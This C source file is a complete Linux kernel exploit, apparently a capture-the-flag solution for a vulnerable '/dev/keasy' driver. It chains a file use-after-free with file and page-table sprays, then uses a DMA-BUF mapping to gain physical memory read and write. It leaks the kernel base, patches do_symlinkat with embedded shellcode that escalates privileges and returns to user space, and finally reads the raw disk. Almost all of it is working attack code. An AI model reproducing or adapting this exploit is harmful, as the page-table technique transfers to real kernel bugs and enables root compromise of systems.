#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#define N_PAGESPRAY 0x200
#define N_FILESPRAY 0x100

#define DMA_HEAP_IOCTL_ALLOC 0xc0184800
typedef unsigned long long u64;
typedef unsigned int u32;
struct dma_heap_allocation_data {
  u64 len;
  u32 fd;
  u32 fd_flags;
  u64 heap_flags;
};

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

int fd, dmafd, ezfd = -1;

static void win() {
  char buf[0x100];
  int fd = open("/dev/sda", O_RDONLY);
  if (fd < 0) {
    puts("[-] Lose...");
  } else {
    puts("[+] Win!");
    read(fd, buf, 0x100);
    write(1, buf, 0x100);
    puts("[+] Done");
  }
  exit(0);
}

int main() {
  int file_spray[N_FILESPRAY];
  void *page_spray[N_PAGESPRAY];

  /**
   * 1. Setup
   */
  // Pin CPU (important!)
  bind_core(0);
  save_state();

  // Open vulnerable device
  int fd = open("/dev/keasy", O_RDWR);
  if (fd == -1)
    fatal("/dev/keasy");
  // Open DMA-BUF
  int dmafd = creat("/dev/dma_heap/system", O_RDWR);
  if (dmafd == -1)
    fatal("/dev/dma_heap/system");

  // Prepare pages (PTE not allocated at this moment)
  for (int i = 0; i < N_PAGESPRAY; i++) {
    page_spray[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
                         0x8000, PROT_READ|PROT_WRITE,
                         MAP_ANONYMOUS|MAP_SHARED, -1, 0);
    if (page_spray[i] == MAP_FAILED) fatal("mmap");
  }

  /**
   * 2. Release the page where dangling file points
   */
  puts("[+] Spraying files...");
  // Spray file (1)
  for (int i = 0; i < N_FILESPRAY/2; i++)
    if ((file_spray[i] = open("/", O_RDONLY)) < 0) fatal("/");

  // Get dangling file descriptorz
  int ezfd = file_spray[N_FILESPRAY/2-1] + 1;
  if (ioctl(fd, 0, 0xdeadbeef) == 0) // Use-after-Free
    fatal("ioctl did not fail");

  // Spray file (2)
  for (int i = N_FILESPRAY/2; i < N_FILESPRAY; i++)
    if ((file_spray[i] = open("/", O_RDONLY)) < 0) fatal("/");

  puts("[+] Releasing files...");
  // Release the page for file slab cache
  for (int i = 0; i < N_FILESPRAY; i++)
    close(file_spray[i]);

  /**
   * 3. Overlap UAF file with PTE
   */
  puts("[+] Allocating PTEs...");
  // Allocate many PTEs (1)
  for (int i = 0; i < N_PAGESPRAY/2; i++)
    for (int j = 0; j < 8; j++)
      *(char*)(page_spray[i] + j*0x1000) = 'A' + j;

  // Allocate DMA-BUF heap
  int dma_buf_fd = -1;
  struct dma_heap_allocation_data data;
  data.len = 0x1000;
  data.fd_flags = O_RDWR;
  data.heap_flags = 0;
  data.fd = 0;
  if (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &data) < 0)
    fatal("DMA_HEAP_IOCTL_ALLOC");
  printf("[+] dma_buf_fd: %d\n", dma_buf_fd = data.fd);

  // Allocate many PTEs (2)
  for (int i = N_PAGESPRAY/2; i < N_PAGESPRAY; i++)    
    for (int j = 0; j < 8; j++)
      *(char*)(page_spray[i] + j*0x1000) = 'A' + j;

  /**
   * 4. Modify PTE entry to overlap 2 physical pages
   */
  // Increment physical address
  for (int i = 0; i < 0x1000; i++)
    if (dup(ezfd) < 0)
      fatal("dup");

  puts("[+] Searching for overlapping page...");
  // Search for page that overlaps with other physical page
  void *evil = NULL;
  for (int i = 0; i < N_PAGESPRAY; i++) {
    // We wrote 'H'(='A'+7) but if it changes the PTE overlaps with the file
      if (*(char*)(page_spray[i] + 7*0x1000) != 'A' + 7) { // +38h: f_count
      evil = page_spray[i] + 0x7000;
      printf("[+] Found overlapping page: %p = 0x%016lx\n", evil,*(unsigned long*)(evil + i * 8));
      break;
    }
  }
  if (evil == NULL) fatal("target not found :(");

  // Place PTE entry for DMA buffer onto controllable PTE
  puts("[+] Remapping...");
  munmap(evil, 0x1000);
  void *dmabuf = mmap(evil, 0x1000, PROT_READ | PROT_WRITE,
                   MAP_SHARED | MAP_POPULATE, dma_buf_fd, 0);
  *(char*)dmabuf = '0';

  /**
   * Get physical AAR/AAW
   */
  // Corrupt physical address of DMA-BUF
  for (int i = 0; i < 0x1000; i++)
    if (dup(ezfd) < 0)
      fatal("dup");
  printf("[+] DMA-BUF now points to PTE: 0x%016lx\n", *(size_t*)dmabuf);

  // Leak kernel physical base
  void *wwwbuf = NULL;
  *(size_t*)dmabuf = 0x800000000009c067;
  for (int i = 0; i < N_PAGESPRAY; i++) {
    if (page_spray[i] == evil) continue;
    if (*(size_t*)page_spray[i] > 0xffff) {
      wwwbuf = page_spray[i];
      printf("[+] Found victim page table: %p\n", wwwbuf);
      break;
    }
  }
  size_t phys_base = ((*(size_t*)wwwbuf) & ~0xfff) - 0x1c04000;
  printf("[+] Physical kernel base address: 0x%016lx\n", phys_base);

  /**
   * Overwrite setxattr
   */
  puts("[+] Overwriting do_symlinkat...");
  size_t phys_func = phys_base + 0x24d4c0;
  *(size_t*)dmabuf = (phys_func & ~0xfff) | 0x8000000000000067;
  char shellcode[] = {0xf3, 0x0f, 0x1e, 0xfa, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x49, 0x81, 0xef, 0xc9, 0xd4, 0x24, 0x00, 0x49, 0x8d, 0xbf, 0xd8, 0x5e, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x20, 0xe6, 0x0a, 0x00, 0xff, 0xd0, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc7, 0x49, 0x8d, 0xb7, 0xe0, 0x5c, 0x44, 0x01, 0x49, 0x8d, 0x87, 0x40, 0xc1, 0x0a, 0x00, 0xff, 0xd0, 0x49, 0x8d, 0xbf, 0x48, 0x82, 0x53, 0x01, 0x49, 0x8d, 0x87, 0x90, 0xf8, 0x27, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xc3, 0x48, 0xbf, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0x98, 0x40, 0x07, 0x00, 0x00, 0x31, 0xc0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0x44, 0x24, 0x08, 0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0xb8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0xb8, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0xb8, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0xb8, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x48, 0x89, 0x44, 0x24, 0x30, 0x49, 0x8d, 0x87, 0x41, 0x0f, 0xc0, 0x00, 0xff, 0xe0, 0xcc};

  void *p;
  p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
  *(size_t*)p = getpid();
  p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
  *(size_t*)p = (size_t)&win;
  p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
  *(size_t*)p = user_cs;
  p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
  *(size_t*)p = user_rflags;
  p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
  *(size_t*)p = user_rsp;
  p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66", 8);
  *(size_t*)p = user_ss;

  memcpy(wwwbuf + (phys_func & 0xfff), shellcode, sizeof(shellcode));
  puts("[+] GO!GO!");

  printf("%d\n", symlink("/jail/x", "/jail"));

  puts("[-] Failed...");
  close(fd);

  getchar();
  return 0;
}
